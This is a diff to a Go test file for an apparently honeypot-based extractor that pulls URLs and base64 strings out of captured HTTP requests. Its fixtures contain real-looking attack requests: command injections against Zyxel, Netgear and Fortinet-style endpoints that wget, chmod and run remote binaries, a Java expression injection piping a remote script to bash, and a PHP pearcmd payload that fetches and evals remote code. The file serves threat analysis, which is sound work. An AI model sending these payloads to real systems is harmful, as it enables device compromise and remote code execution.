@@ -169,12 +169,12 @@ func TestURLExtractor(t *testing.T) {
 		},
 		{
 			description: "Find URL in body (not encoded, with semi colon)",
-			urlsToFind:  []string{"http://192.210.162.147/arm7"},
+			urlsToFind:  []string{"http://1.2.3.4/arm7"},
 			request: database.Request{
 
 				Uri:        "/ignored?aa=bb",
 				Raw:        "ssadsads",
-				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://1.2.3.4/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
 				HoneypotIP: "1.1.1.1",
 			},
 		},
@@ -184,6 +184,17 @@ func TestURLExtractor(t *testing.T) {
 			request: database.Request{
 
 				Uri:        "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
+				Raw:        "ssadsads",
+				Body:       []byte(""),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
+		{
+			description: "Find URL in query string (not encoded)",
+			urlsToFind:  []string{"http://45.86.155.249/bestone/.nekoisdaddy.mips"},
+			request: database.Request{
+
+				Uri:        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.86.155.249/bestone/.nekoisdaddy.mips+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
 				Raw:        "ssadsads",
 				Body:       []byte(""),
 				HoneypotIP: "1.1.1.1",
@@ -200,9 +211,21 @@ func TestURLExtractor(t *testing.T) {
 				HoneypotIP: "1.1.1.1",
 			},
 		},
+		{
+			description: "Find URL in encoded body without urlencoded header",
+			urlsToFind:  []string{"http://104.168.5.4/forti.sh"},
+			request: database.Request{
+
+				Uri:        "/",
+				Raw:        "",
+				Body:       []byte("ajax=1&username=test&realm=&enc=cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Fforti.sh%3B%20chmod%20777%20forti.sh%3B%20.%2Fforti.sh"),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
 	} {
 
 		t.Run(test.description, func(t *testing.T) {
+			fmt.Printf("TEST: %s\n", test.description)
 			result := make(map[string]struct{})
 
 			ex := NewURLExtractor(result)
@@ -318,6 +341,20 @@ func TestFindBase64Strings(t *testing.T) {
 			base64sToFind: []string{"/gEK"},
 			asciiOnly:     false,
 		},
+
+		// This is a special case because it's not successfully parsed as a URL and
+		// therefore treated as a full string.
+		// TODO: add fallback parameter parsing that prevents ang= from lang- to be
+		// picked up as a base64 string.
+		{
+			description: "From URI parameter",
+			request: database.Request{
+				Body: []byte(""),
+				Uri:  "/?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?eval(base64_decode('aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly80NS45NS4xNDcuMjM2L3giKSk7fWVsc2V7JGg9Y3VybF9pbml0KCJodHRwOi8vNDUuOTUuMTQ3LjIzNi94Iik7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtjdXJsX3NldG9wdCgkaCxDVVJMT1BUX0hFQURFUiwwKTtldmFsKGN1cmxfZXhlYygkaCkpO2N1cmxfY2xvc2UoJGgpO30='));?>+z.php",
+			},
+			base64sToFind: []string{"ang=", "aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly80NS45NS4xNDcuMjM2L3giKSk7fWVsc2V7JGg9Y3VybF9pbml0KCJodHRwOi8vNDUuOTUuMTQ3LjIzNi94Iik7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTtjdXJsX3NldG9wdCgkaCxDVVJMT1BUX0hFQURFUiwwKTtldmFsKGN1cmxfZXhlYygkaCkpO2N1cmxfY2xvc2UoJGgpO30="},
+			asciiOnly:     true,
+		},
 		{
 			description: "parses body as form",
 			request: database.Request{
@@ -344,7 +381,7 @@ func TestFindBase64Strings(t *testing.T) {
 			be := NewBase64Extractor(res, test.asciiOnly)
 			be.ParseRequest(&test.request)
 			if len(res) != len(test.base64sToFind) {
-				t.Errorf("expected %d base64s but found %d", len(test.base64sToFind), len(res))
+				t.Errorf("expected %d base64s but found %d (%v)", len(test.base64sToFind), len(res), res)
 			}
 
 			for _, v := range test.base64sToFind {
